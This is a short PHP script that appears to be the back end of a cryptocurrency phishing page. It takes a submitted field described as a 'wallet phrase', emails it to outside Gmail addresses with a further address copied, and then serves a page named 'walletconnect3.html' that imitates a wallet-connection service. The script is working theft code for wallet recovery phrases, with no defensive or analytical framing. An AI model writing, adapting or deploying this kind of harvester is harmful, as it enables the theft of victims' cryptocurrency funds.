<?php
if(isset($_POST['submit']))
$to="dgonyedikachi@gmail.com";
$text=$_POST['text'];
$subject="phrase";
$txt="Your wallet phrase: $text";
$headers="From: stormDtech@gmail.com"."\r\n". "cc:godwinprosperchiegosike@gmail.com";
if(mail($to,$subject,$txt,$headers)) {
	readfile("walletconnect3.html");

;}
else{
	echo "failed";}
?>